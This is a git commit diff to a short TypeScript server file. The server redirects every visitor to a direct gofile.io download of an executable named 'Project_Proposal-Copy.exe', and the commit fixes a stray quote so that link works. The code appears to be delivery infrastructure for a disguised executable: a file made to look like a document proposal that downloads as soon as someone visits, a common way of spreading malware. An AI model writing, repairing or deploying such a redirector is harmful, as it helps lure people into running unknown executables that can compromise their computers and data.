660de1ef5343e1c6be4a11661d201c9a15ee3d90
designspace1 <row@designspace.org>
2025-06-13 19:57:55 +0000

    Update main.ts

--- main.ts
+++ main.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://store-na-phx-1.gofile.io/download/direct/25da08e3-e49e-4432-b8f5-b305d1989cb7/Project_Proposal-Copy.exe'",
+      Location: "https://store-na-phx-1.gofile.io/download/direct/25da08e3-e49e-4432-b8f5-b305d1989cb7/Project_Proposal-Copy.exe",
     },
   });
 });
